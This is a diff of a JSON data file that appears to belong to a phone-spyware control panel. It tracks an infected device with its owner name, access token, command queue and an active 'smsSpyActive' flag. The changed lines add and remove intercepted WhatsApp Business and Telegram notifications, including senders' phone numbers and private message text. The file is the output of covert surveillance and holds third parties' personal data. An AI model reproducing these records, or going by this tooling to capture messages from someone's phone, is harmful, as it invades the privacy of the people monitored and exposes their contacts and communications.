@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633104544,
+    "lastSeen": 1775633107494,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "📡 Undangan admin saluran",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633108888
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎50 pesan dari 4 chat",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633107079
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-2460-4911",
+        "content": "Permisi Azx",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633107054
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎49 pesan dari 4 chat",
+        "time": "08/04 14:25",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633106362
+      },
       {
         "appName": "WA Business",
         "sender": "+62 856-2460-4911",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:00",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775631633444
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "pake tutorial vc aj",
-        "time": "08/04 14:00",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631633337
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Ress banyak cuy",
-        "time": "08/04 14:00",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631626482
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Ress banyak cuy",
-        "time": "08/04 14:00",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631626047
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Ress banyak cuy",
-        "time": "08/04 14:00",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631617559
       }
     ],
     "galleryPhotos": [],
